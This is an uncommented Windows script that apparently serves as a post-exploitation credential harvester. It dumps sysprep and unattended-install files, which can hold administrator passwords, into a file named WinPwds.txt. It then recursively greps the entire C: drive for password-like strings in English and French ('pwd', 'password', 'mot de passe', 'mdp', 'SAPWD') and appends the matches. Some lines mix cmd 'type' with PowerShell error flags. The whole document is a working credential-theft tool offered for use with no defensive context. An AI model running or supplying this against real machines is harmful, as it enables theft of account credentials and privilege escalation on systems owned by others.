type %WINDIR%\sysprep\sysprep.xml -erroraction 'silentlycontinue' > WinPwds.txt
type %WINDIR%\sysprep\sysprep.inf -erroraction 'silentlycontinue' >> WinPwds.txt
type %WINDIR%\sysprep.inf -erroraction 'silentlycontinue' >> WinPwds.txt
type %WINDIR%\Panther\Unattended.xml -erroraction 'silentlycontinue' >> WinPwds.txt
type %WINDIR%\Panther\Unattend.xml -erroraction 'silentlycontinue' >> WinPwds.txt
type %WINDIR%\Panther\Unattend\Unattend.xml -erroraction 'silentlycontinue' >> WinPwds.txt
type %WINDIR%\Panther\Unattend\Unattended.xml -erroraction 'silentlycontinue' >> WinPwds.txt
type %WINDIR%\System32\Sysprep\unattend.xml -erroraction 'silentlycontinue' >> WinPwds.txt
type %WINDIR%\System32\Sysprep\unattended.xml -erroraction 'silentlycontinue' >> WinPwds.txt
type %WINDIR%\..\unattend.txt -erroraction 'silentlycontinue' >> WinPwds.txt
type %WINDIR%\..\unattend.inf -erroraction 'silentlycontinue' >> WinPwds.txt
type %WINDIR%\unattend.txt -erroraction 'silentlycontinue' >> WinPwds.txt
type %WINDIR%\unattend.inf -erroraction 'silentlycontinue' >> WinPwds.txt

Get-ChildItem -Path C:\ -Recurse -exclude *.dll, *.pdb,  *.cache, *.exe -erroraction 'silentlycontinue'  | select-string -Pattern "pwd.{1,12}"  -AllMatches -outvariable test  -erroraction 'silentlycontinue'  |  % { $_.Matches } |  % { $_.Value } >> WinPwds.txt
Get-ChildItem -Path C:\ -Recurse -exclude *.dll, *.pdb,  *.cache, *.exe -erroraction 'silentlycontinue'  | select-string -Pattern "password.{1,12}"  -AllMatches -outvariable test  -erroraction 'silentlycontinue'  |  % { $_.Matches } |  % { $_.Value } >> WinPwds.txt
Get-ChildItem -Path C:\ -Recurse -exclude *.dll, *.pdb,  *.cache, *.exe -erroraction 'silentlycontinue'  | select-string -Pattern "-p .{1,12}"  -AllMatches -outvariable test  -erroraction 'silentlycontinue'  |  % { $_.Matches } |  % { $_.Value } >> WinPwds.txt
Get-ChildItem -Path C:\ -Recurse -exclude *.dll, *.pdb,  *.cache, *.exe -erroraction 'silentlycontinue'  | select-string -Pattern "mot de passe.{1,12}"  -AllMatches -outvariable test  -erroraction 'silentlycontinue'  |  % { $_.Matches } |  % { $_.Value } >> WinPwds.txt
Get-ChildItem -Path C:\ -Recurse -exclude *.dll, *.pdb,  *.cache, *.exe -erroraction 'silentlycontinue'  | select-string -Pattern "SAPWD.{1,12}"  -AllMatches -outvariable test  -erroraction 'silentlycontinue'  |  % { $_.Matches } |  % { $_.Value } >> WinPwds.txt
Get-ChildItem -Path C:\ -Recurse -exclude *.dll, *.pdb,  *.cache, *.exe -erroraction 'silentlycontinue'  | select-string -Pattern "mdp.{1,12}"  -AllMatches -outvariable test  -erroraction 'silentlycontinue'  |  % { $_.Matches } |  % { $_.Value } >> WinPwds.txt
